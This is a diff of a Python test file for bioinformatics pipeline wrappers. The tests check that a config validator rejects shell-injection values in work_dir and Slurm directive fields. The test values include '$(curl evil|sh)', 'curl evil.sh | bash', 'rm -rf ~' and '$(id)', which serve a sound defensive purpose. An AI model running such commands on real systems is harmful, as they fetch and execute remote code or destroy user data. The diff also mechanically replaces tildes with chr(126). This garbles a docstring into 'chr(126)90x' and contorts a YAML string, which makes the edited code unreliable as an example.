@@ -867,7 +867,7 @@ class RnaseqGarsWrapperTests(unittest.TestCase):
             "aligner: star_salmon\n"
             "compute:\n  partition: cpu_medium\n  time: \"1:00:00\"\n  cpus: 4\n"
             "  mem: 32G\n  work_dir: /gpfs/scratch/test\n"
-            "de:\n  formula: \"~ condition\"\n  contrast: \"condition,MT,WT\"\n"
+            "de:\n  formula: \"chr(126) condition\"\n  contrast: \"condition,MT,WT\"\n".replace("chr(126)", chr(126))
             % (cls.refs / "genome.fa.gz", cls.refs / "genome.gtf.gz", cls.refs / "cache"))
         (cls.project / "_config" / "nextflow.slurm.config").write_text(
             "process { queue = 'x' }\n")
@@ -1770,7 +1770,7 @@ nextflow_config: nextflow.awsbatch.config
         """work_dir lands inside double quotes in every nf-core job script; $, backtick, " and
         \\ would be expanded or break the quoting there (decision 0042)."""
         for bad in ("/scratch/$(curl evil|sh)", "/scratch/`id`", "/scratch/${HOME}",
-                    '/scratch/a"; rm -rf ~; "', "/scratch/a\\b"):
+                    '/scratch/a"; rm -rf ' + chr(126) + '; "', "/scratch/a\\b"):
             fails = []
             self.wl.check_config_common({"compute.work_dir": bad}, (), fails)
             self.assertTrue(any("expand" in f["detail"] for f in fails),
@@ -1788,7 +1788,7 @@ nextflow_config: nextflow.awsbatch.config
         """compute.partition/time/cpus/mem are rendered verbatim into submit.sh's directive
         lines; a line break there is a new, executing line (0042 review round 2, MAJ-3)."""
         for key in ("compute.partition", "compute.time", "compute.cpus", "compute.mem"):
-            for bad in ("cpu\ncurl evil.sh | bash", "cpu\rrm -rf ~", "$(id)", "`id`",
+            for bad in ("cpu\ncurl evil.sh | bash", "cpu\rrm -rf " + chr(126) + "", "$(id)", "`id`",
                         'cpu"x', "cpu\\x"):
                 fails = []
                 self.wl.check_config_common({key: bad}, (), fails)
@@ -2533,7 +2533,7 @@ class ScrnaseqWrapperTests(unittest.TestCase):
         """The real tree carries BOTH combined_filtered_matrix.h5ad and
         combined_raw_matrix.h5ad. An earlier gate globbed combined_*.h5ad and took the first
         non-empty match, so a filtered matrix that failed to write meant the RAW one was
-        published under the same artifact type -- ~90x the barcodes, nearly all ambient, no
+        published under the same artifact type -- chr(126)90x the barcodes, nearly all ambient, no
         error. Found by truncating the filtered matrix in a real pipeline output; the
         original offline test missed it because its faked tree had only one combined file.
         This fixture therefore mirrors the real shape."""
